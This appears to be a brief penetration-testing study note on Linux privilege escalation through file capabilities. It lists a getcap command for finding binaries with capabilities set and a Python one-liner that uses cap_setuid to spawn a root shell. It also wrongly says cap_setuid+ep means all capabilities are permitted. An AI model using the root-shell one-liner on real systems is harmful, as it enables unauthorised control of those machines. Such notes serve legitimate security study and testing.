 Capabilities

* Similar to SUID in concept 
* More modern than SUID
## Hunting 
	* getcap -r / 2>/dev/null
	* Output: /usr/bin/python2.6 = cap_setuid+ep
		* means that all capabilites are permitted
	* /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
	* Gives root 